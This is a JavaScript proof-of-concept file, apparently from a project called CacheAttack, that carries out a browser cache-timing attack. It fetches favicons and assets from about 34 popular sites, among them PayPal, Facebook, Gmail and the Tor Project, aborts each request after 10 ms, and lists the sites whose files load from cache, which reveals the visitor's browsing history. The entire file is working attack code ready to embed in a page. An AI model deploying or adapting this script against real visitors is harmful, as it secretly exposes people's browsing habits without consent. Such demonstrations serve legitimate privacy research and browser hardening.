// NDev 2019 https://github.com/NDevTK/CacheAttack
const max = 10;
const cache_test = "https://ndev.tk/README.md?".concat(Math.random());
Websites = new Map();
Websites.set('https://www.microsoft.com/favicon.ico?v2', "Microsoft")
.set("https://github.com/manifest.json", "Github")
.set("https://discordapp.com/assets/07dca80a102d4149e9736d4b162cff6f.ico", "Discord")
.set("https://s.yimg.com/rz/l/favicon.ico", "Yahoo")
.set("https://outlook.live.com/owa/favicon.ico", "Outlook")
.set("https://combo.staticflickr.com/pw/favicon.ico", "Flicker")
.set("https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico", "Facebook")
.set("https://twitter.com/manifest.json", "Twitter")
.set("https://ndev.tk/favicon.ico", "NVDev")
.set("https://www.bing.com/sa/simg/bing_p_rr_teal_min.ico", "Bing")
.set("https://www.redditstatic.com/desktop2x/fonts/IBMPlexSans/Regular-116bb6d508f5307861d3b1269bc597e7.woff2", "Reddit")
.set("https://www.youtube.com/yts/cssbin/player-vflARfyPN/www-player-2x-webp.css", "Youtube")
.set("https://store.steampowered.com/favicon.ico", "Steam")
.set("https://ssl.gstatic.com/ui/v1/icons/mail/images/favicon5.ico", "Google mail")
.set("https://www.gstatic.com/images/branding/googlemic/2x/googlemic_color_24dp.png", "Google")
.set("https://cdn.sstatic.net/Sites/stackoverflow/img/favicon.ico?v=4f32ecc8f43d", "Stack Overflow")
.set("https://cdn.sstatic.net/Sites/security/img/favicon.ico?v=7585a77d4575", "Information Security Stack Exchange")
.set("https://cdn.sstatic.net/Sites/codereview/img/logo.svg?v=0dfb1294dc6e0", "Code Review Stack Exchange")
.set("https://cdn.sstatic.net/Sites/superuser/img/favicon.ico?v=29b26120d2c5", "Super User")
.set("https://static-global-s-msn-com.akamaized.net/hp-neu/sc/2b/a5ea21.ico", "MSN")
.set("https://www.torproject.org/static/images/favicon/favicon.ico", "Tor Project")
.set("https://duckduckgo.com/favicon.ico", "DuckDuckGo")
.set("https://secure.skypeassets.com/apollo/2.1.1477/images/icons/favicon.ico", "Skype")
.set("https://www.amazon.com/favicon.ico", "Amazon")
.set("https://pages.ebay.com/favicon.ico", "ebay")
.set("https://www.instagram.com/static/images/ico/xxhdpi_launcher.png/99cf3909d459.png", "Instagram")
.set("https://www.wikipedia.org/portal/wikipedia.org/assets/img/Wikipedia-logo-v2.png", "Wikipedia")
.set("https://static.twitchcdn.net/config/manifest.json?v=1", "Twitch")
.set("https://mixer.com/_latest/manifest.635204ac900584fbb9dd0a1c8931216b.json", "Mixer")
.set("https://www.apple.com/wss/fonts/SF-Pro-Text/v2/sf-pro-text_regular.woff2", "Apple")
.set("https://www.baidu.com/img/baidu_resultlogo@2.png", "Baidu")
.set("https://ssl.gstatic.com/android/market_images/web/loading_dark_small.gif", "Google play")
.set("https://www.paypalobjects.com/webstatic/icon/favicon.ico", "PayPal")

document.addEventListener('DOMContentLoaded', _ => {
    setTimeout(async _ => {
        // If current page is cached
        ifCached("https://cache.ndev.tk/favicon.ico").then(async _ => {
            // AbortController check
            await ifCached(cache_test).catch(_ => {});
            ifCached(cache_test).then(_ => info.innerText = "AbortController check failed").catch(async _ => {
                // Foreach website check if cached
                for (let website of Websites) {
                    await Checker(website[1], website[0]);
                }
                if (dataTable.hidden === true) info.innerText = "No result found :(";
            }).catch(_ => info.innerText = "Cache is disabled");
        });
    }, 150)
});

async function addData(displayName) {
    dataTable.hidden = false;
    info.hidden = true;
    data.insertRow(0).insertCell(0).innerText = displayName;
}

// Add website to table if cached
async function Checker(displayName, url) {
  await ifCached(url).then(_ => addData(displayName)).catch(_ => {});
}

async function ifCached(url){
  var controller = new AbortController();
  var signal = controller.signal;
  let timeout = await setTimeout(_ => { // Stop request after max
    controller.abort();
    throw "Timeout";
  }, max);
  await fetch(url, {mode: "no-cors", signal});
  clearTimeout(timeout);
  return;
}
